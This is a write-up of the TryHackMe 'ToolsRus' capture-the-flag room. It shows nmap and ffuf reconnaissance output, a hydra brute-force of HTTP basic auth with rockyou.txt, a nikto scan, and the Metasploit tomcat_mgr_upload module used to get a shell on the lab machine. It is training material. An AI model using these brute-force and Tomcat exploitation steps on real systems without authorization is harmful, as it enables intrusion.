---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . ToolsRus
# DESCRIPTION       . Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/toolsrus
```

```bash
sudo nmap -sSVC -T5 10.10.75.25 -p- -oN toolsrus
```

```
PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d65b83ac39f5acb4bc147742a7a5a5fc (RSA)
|   256 869a54f60aa086f8790cc8769042de19 (ECDSA)
|_  256 708f6a2df1fcfd92649705dd2eeebdaa (ED25519)

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)

1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
ffuf -u http://10.10.75.25/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

```
guidelines              [Status: 301, Size: 315, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 168, Words: 16, Lines: 5]
protected               [Status: 401, Size: 458, Words: 42, Lines: 15]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
```


> What directory can you find, that begins with a "g"?

- guidelines

> Whose name can you find from this directory?

```
Hey bob, did you update that TomCat server? 
```

- bob

> What directory has basic authentication?

- protected

> What is bob's password to the protected part of the website?

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt http-get /protected
```

> What other port that serves a webs service is open on the machine?

- 1234

> What is the name and version of the software running on the port from question 5?

- _http-title: Apache Tomcat/7.0.88

> Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.
  How many documentation files did Nikto identify?

```
nikto -id bob:[password] -h http://10.10.75.25:1234/manager/html
```

- 5

> What is the server version?

_http-server-header: Apache/2.4.18 (Ubuntu)

> What version of Apache-Coyote is this service using?

_http-server-header: Apache-Coyote/1.1

> Use Metasploit to exploit the service and get a shell on the system.
  What user did you get a shell as?

- After some googling around, I found out that Apache Coyote 1.1 is vulnerable by using the metasploit `tomcat_mgr_upload` module.

```
use exploit/multi/http/tomcat_mgr_upload
```

- set `HttpPasswsord`, `Httpusername`, `RHOSTS`, `RPORT` and `run`.

- flag is in `/root/flag.txt`

